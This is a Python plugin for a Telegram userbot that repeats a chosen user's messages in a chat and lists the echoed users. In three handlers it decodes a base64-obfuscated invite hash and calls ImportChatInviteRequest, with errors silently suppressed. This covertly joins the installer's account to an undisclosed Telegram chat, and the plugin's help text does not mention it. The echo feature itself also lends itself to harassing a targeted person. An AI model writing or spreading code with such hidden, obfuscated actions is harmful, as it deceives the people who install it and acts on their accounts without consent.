# Echo remastered by @Kraken_The_BadASS for Hêllẞø†
# Codes by @mrconfused
# Kang with credits

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.plugins.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    if mafia.reply_to_msg_id is not None:
        reply_msg = await mafia.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mafia.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mafia.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(mafia, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(mafia, "Hii....😄🤓")
    else:
        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    if mafia.reply_to_msg_id is not None:
        reply_msg = await mafia.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mafia.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mafia.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(mafia, "Echo has been stopped for the user")
        else:
            await edit_or_reply(mafia, "The user is not activated with echo")
    else:
        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(mafia, reply_text)
    else:
        await edit_or_reply(mafia, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(mafia):
    if mafia.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(mafia.sender_id, mafia.chat_id):
        await asyncio.sleep(2)
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await mafia.client(kraken)
        except BaseException:
            pass
        if mafia.message.text or mafia.message.sticker:
            await mafia.reply(mafia.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.echo` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
